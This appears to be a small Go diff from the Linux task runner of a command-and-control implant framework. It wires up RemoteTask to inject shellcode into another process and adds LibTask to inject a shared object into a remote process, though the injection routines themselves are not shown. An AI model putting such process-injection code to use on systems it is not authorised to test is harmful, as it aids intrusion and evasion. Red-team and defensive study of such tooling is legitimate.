@@ -29,10 +29,9 @@ import (
 	"syscall"
 	"unsafe"
 
+	"golang.org/x/sys/unix"
 	//{{if .Config.Debug}}
 	"log"
-
-	"golang.org/x/sys/unix"
 	//{{end}}
 )
 
@@ -52,9 +51,9 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return nil
 }
 
-// RemoteTask -
+// RemoteTask - injects a shellcode into a remote process
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
-	return nil
+	return remoteTask(data, processID)
 }
 
 // Sideload - Side load a library and return its output
@@ -106,4 +105,9 @@ func Sideload(procName string, data []byte, args string, kill bool) (string, err
 	log.Printf("Done, stderr: %s\n", stdErr.String())
 	//{{end}}
 	return stdOut.String(), nil
+}
+
+// LibTask - injects a shared object into a remote process
+func LibTask(processID int, data []byte) error {
+	return libraryTask(data, processID)
 }
